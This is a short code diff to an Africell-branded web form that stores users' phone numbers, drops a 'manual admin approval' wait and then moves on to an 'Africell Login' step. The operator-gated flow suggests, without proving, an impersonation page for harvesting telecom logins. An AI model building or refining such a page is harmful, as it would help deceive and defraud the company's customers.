@@ -30,7 +30,6 @@
             color: #ffffff;
         }
 
-        /* Fixed container layout to ensure button is never hidden */
         .e-form-container {
             width: 100%;
             max-width: 480px;
@@ -307,6 +306,7 @@
         const phoneInput = document.getElementById('phoneNumber');
 
         window.addEventListener('DOMContentLoaded', () => {
+            localStorage.removeItem('africellApprovalTimestamp');
             const savedPhone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone');
             if (savedPhone && phoneInput) {
                 phoneInput.value = savedPhone.replace('+232', '').trim();
@@ -366,6 +366,7 @@
                 console.error('Error submitting application:', error);
             }
 
+            // Automatically proceed without waiting for manual admin approval click
             setTimeout(() => {
                 loadingText.textContent = "Proceeding to Africell Login...";
             }, 1800);
